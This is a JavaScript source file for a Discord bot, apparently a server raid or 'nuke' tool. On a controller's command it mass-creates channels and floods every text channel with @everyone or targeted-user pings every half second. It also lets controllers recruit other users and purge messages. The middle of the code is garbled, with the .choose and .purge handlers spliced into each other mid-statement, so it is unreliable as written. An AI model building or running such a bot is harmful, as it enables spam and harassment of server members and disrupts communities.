import { Client, Events, GatewayIntentBits } from 'discord.js';

const AUTHORIZED_USER_IDS = new Set(["1298640383688970293"]);
let isSpamming = false;
let spamInterval = null;
let channelInterval = null;
const createdChannelIds = new Set();
let spamPhrase = "Ghaith is king";
let targetedUserId = null;

const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ] 
});

client.once(Events.ClientReady, (c) => {
  console.log(`Ready! Logged in as ${c.user.tag}`);
});

client.on(Events.MessageCreate, async (message) => {
  if (message.author.bot) return;
  if (!AUTHORIZED_USER_IDS.has(message.author.id)) return;

  if (message.content.startsWith('.recruit')) {
    const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
    if (targetId) {
      AUTHORIZED_USER_IDS.add(targetId);
      try {
        await message.reply(`User <@${targetId}> has been recruited.`);
      } catch (e) {}
    }
    return;
  }

  if (message.content.startsWith('.revoke')) {
    const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
    if (targetId) {
      AUTHORIZED_USER_IDS.delete(targetId);
      try {
        await message.reply(`User <@${targetId}> has been revoked.`);
      } catch (e) {}
    }
    return;
  }

  if (message.content.startsWith('.change')) {
    const newPhrase = message.content.split(' ').slice(1).join(' ');
    if (newPhrase) {
      spamPhrase = newPhrase;
      try {
        await message.reply(`Spam phrase changed to: ${newPhrase}`);
      } catch (e) {}
    }
    return;
  }

  if (message.content.startsWith('.choose')) {
    const target = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
    if (target) {
      targetedUserId = target;
      try {
        await message.reply(`Targeted user set to <@${target}>.`);
      } catch (e) {}
    } else {
      targetedUserId = null;
      try {
        await .startsWith('.purge')) {
    const amount = parseInt(message.content.split(' ')[1]);
    if (isNaN(amount) || amount <= 0) {
      return message.reply('Please specify a valid number of messages to purge (e.g., .purge 50).').catch(() => {});
    }

    const deleteAmount = Math.min(amount, 100); // Discord bulkDelete limit is 100
    try {
      const deleted = await message.channel.bulkDelete(deleteAmount, true);
      message.channel.send(`Successfully purged ${deleted.size} messages.`).then(msg => {
        setTimeout(() => msg.delete().catch(() => {}), 3000);
      }).catch(() => {});
    } catch (err) {
      message.reply('Failed to purge messages. They might be older than 14 days.').catch(() => {});
    }
    return;
  }

  if (message.contentmessage.reply("Targeted user cleared. Pinging @everyone.");
      } catch (e) {}
    }
    return;
  }

  if (message.content === '.start') {
    if (isSpamming) return;
    isSpamming = true;
    
    const guild = message.guild;
    if (!guild) return;

    const createChannels = async () => {
      if (!isSpamming) return;
      for (let i = 0; i < 10; i++) {
        if (!isSpamming) break;
        try {
          const channel = await guild.channels.create({
            name: spamPhrase,
            type: 0,
          });
          createdChannelIds.add(channel.id);
          const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
          channel.send(`${mention} ${spamPhrase}`).catch(() => {});
        } catch (e) {
          break;
        }
      }
    };

    const spamMessages = async () => {
      if (!isSpamming) return;
      const channels = guild.channels.cache.filter(c => c.isTextBased());
      channels.forEach(async (channel) => {
        if (!isSpamming) return;
        try {
          const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
          for(let i=0; i<3; i++) {
            if (!isSpamming) break;
            channel.send(`${mention} ${spamPhrase}`).catch(() => {});
          }
        } catch (e) {}
      });
    };

    createChannels();
    spamMessages();
    channelInterval = setInterval(createChannels, 1000);
    spamInterval = setInterval(spamMessages, 500);
  }

  if (message.content === '.stop') {
    isSpamming = false;
    if (spamInterval) {
      clearInterval(spamInterval);
      spamInterval = null;
    }
    if (channelInterval) {
      clearInterval(channelInterval);
      channelInterval = null;
    }

    try {
      await message.reply('Stopping and cleaning up...');
    } catch (e) {}
    
    const guild = message.guild;
    if (guild) {
      (async () => {
        const channelDeletions = Array.from(createdChannelIds).map(async (channelId) => {
          try {
            const channel = await guild.channels.fetch(channelId);
            if (channel) await channel.delete();
          } catch (e) {}
        });
        createdChannelIds.clear();

        const nameDeletions = guild.channels.cache
          .filter(c => c.name === 'ghaith-is-king' || c.name === 'Ghaith is king' || c.name === spamPhrase.toLowerCase().replace(/\s+/g, '-'))
          .map(async (channel) => {
            try {
              await channel.delete();
            } catch (e) {}
          });

        await Promise.all([...channelDeletions, ...nameDeletions]);

        const textChannels = guild.channels.cache.filter(c => c.isTextBased());
        textChannels.forEach(async (channel) => {
          try {
            const messages = await channel.messages.fetch({ limit: 100 });
            const spamMessages = messages.filter(m => (m.content.includes(spamPhrase) || m.content.includes('Ghaith is king')) && m.author.id === client.user.id);
            if (spamMessages.size > 0) {
              await channel.bulkDelete(spamMessages).catch(() => {
                spamMessages.forEach(m => m.delete().catch(() => {}));
              });
            }
          } catch (e) {}
        });
      })();
    }
    return;
  }
});

client.login(process.env.DISCORD_TOKEN).catch(console.error);
